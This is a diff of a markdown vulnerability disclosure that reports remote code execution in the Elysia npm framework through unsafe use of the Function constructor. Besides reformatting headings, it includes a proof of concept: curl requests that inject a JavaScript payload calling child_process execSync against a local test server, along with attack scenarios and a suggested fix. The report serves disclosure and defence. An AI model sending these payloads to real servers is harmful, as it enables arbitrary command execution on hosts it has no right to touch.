@@ -1,28 +1,27 @@
 # vuln-elysia-1.3.21-rce
 
-# Summary
+## Summary
 
 Elysia (npm) is vulnerable to **Remote Code Execution (RCE)** due to **unsafe dynamic code generation**.  
-Through version **1.3.21 (latest tested)**, the framework constructs handler functions by interpolating strings directly into `Function(...)`.  
+Through version **1.3.21 (latest tested)**, the framework constructs handler functions by interpolating strings directly into the JavaScript Function constructor (`Function(...)`).  
 If attacker-controlled values flow into these strings (e.g., schema definitions, parser names, plugin-provided hooks), arbitrary JavaScript or OS command execution becomes possible.
 
-- Vulnerability Class: **Code Injection via Unsafe Dynamic Code Generation** (CWE-94 / CWE-95)  
-- Severity: **High / Critical** (CVSS ~8.8)  
-- Exploitability: Any untrusted values that reach handler composition can lead to RCE.  
+- **Vulnerability Class:** Code Injection via Unsafe Dynamic Code Generation (CWE-94 / CWE-95)  
+- **Severity:** High / Critical (CVSS ~8.8)  
+- **Exploitability:** Any untrusted values that reach handler composition can lead to RCE.  
 
 ---
 
-# Details
+## Details
 
 - **Package:** `elysia` (npm)  
 - **Repository:** [github.com/elysiajs/elysia](https://github.com/elysiajs/elysia)  
 - **Affected File:** `src/compose.ts`  
 - **Affected Function(s):** `composeHandler`, `compile`  
 - **Affected Versions:** ≤ 1.3.21 (latest tested)  
-- **Root Cause:** Dynamic handler generation using `Function(...)` with string concatenation.  
+- **Root Cause:** Dynamic handler generation using the JavaScript Function constructor (`Function(...)`) with string concatenation.  
 
 ### Relevant code from `src/compose.ts`
-
 ```ts
 // elysia/src/compose.ts (example excerpt)
 const fn = Function('"use strict";\n' + fnLiteral)()
@@ -33,11 +32,11 @@ If these values include attacker-controlled strings, they are interpolated direc
 
 ---
 
-# Proof of Concept (PoC)
+## Proof of Concept (PoC)
 
-## Steps to Reproduce
+### Steps to Reproduce
 
-### 1. Environment Setup
+#### 1. Environment Setup
 ```bash
 sudo apt-get update && sudo apt-get install -y python3-venv
 python3 -m venv venv
@@ -50,7 +49,7 @@ npm init -y
 npm install elysia@1.3.21
 ```
 
-### 2. Vulnerable Server (`server.js`)
+#### 2. Vulnerable Server (`server.js`)
 ```js
 import { Elysia } from 'elysia'
 import { createRequire } from 'module'
@@ -105,40 +104,32 @@ http.createServer(async (req, res) => {
 })
 ```
 
-### 3. Run the server
+#### 3. Run the server
 ```bash
 node server.js
 ```
 
-### 4. Inject malicious payload
+#### 4. Inject malicious payload
 ```bash
-curl -X POST http://localhost:3000/config \
-  -H "Content-Type: text/plain" \
-  --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("whoami").toString() })()'
+curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("whoami").toString() })()'
 ```
 
-### 5. Trigger vulnerable endpoint
+#### 5. Trigger vulnerable endpoint
 ```bash
-curl -X POST http://localhost:3000/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker"}'
+curl -X POST http://localhost:3000/register   -H "Content-Type: application/json"   -d '{"username":"attacker"}'
 ```
 
-### Expected Output
+#### Expected Output
 ```json
 {"body":"[system_username]\n"}
 ```
 *Note: Output varies depending on the server environment (e.g., "root", "ubuntu", "www-data", etc.)*
 
-### Arbitrary Command Example
+#### Arbitrary Command Example
 ```bash
-curl -X POST http://localhost:3000/config \
-  -H "Content-Type: text/plain" \
-  --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("id").toString() })()'
+curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("id").toString() })()'
 
-curl -X POST http://localhost:3000/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker"}'
+curl -X POST http://localhost:3000/register   -H "Content-Type: application/json"   -d '{"username":"attacker"}'
 ```
 
 Expected:
@@ -149,11 +140,11 @@ Expected:
 
 ---
 
-# Attack Vector
+## Attack Vector
 
 This vulnerability becomes exploitable in **real-world deployments** when applications using Elysia load or accept **untrusted values** that are used in handler composition.
 
-**Scenarios include:**
+### Scenarios include:
 1. **DB-driven config/schema**  
    Applications that fetch schema or parser options from a database, possibly controlled by tenants or admins. An attacker can inject malicious strings into DB records → Elysia interpolates them into `fnLiteral` → RCE.
 
@@ -171,7 +162,7 @@ The vulnerability is not limited to contrived examples. Any path that takes user
 
 ---
 
-# Impact
+## Impact
 
 - **Remote Code Execution** in the context of the Node.js process  
 - **Full application compromise** and potential host compromise  
@@ -183,7 +174,7 @@ The vulnerability is not limited to contrived examples. Any path that takes user
 
 ---
 
-# Risk / Remarks
+## Risk / Remarks
 
 While I am not entirely sure whether maintainers will consider this eligible for a CVE, I believe it should be.  
 The root cause (`Function(...)` with unsanitized strings in `src/compose.ts`) is a **well-known dangerous pattern** (CWE-94 / CWE-95).  
@@ -192,7 +183,7 @@ Severity should be rated **High/Critical**.
 
 ---
 
-# Suggested Fix
+## Suggested Fix
 
 - Remove reliance on `Function(...)` for runtime code generation.  
 - Sanitize or strictly validate any input that can reach handler composition.  
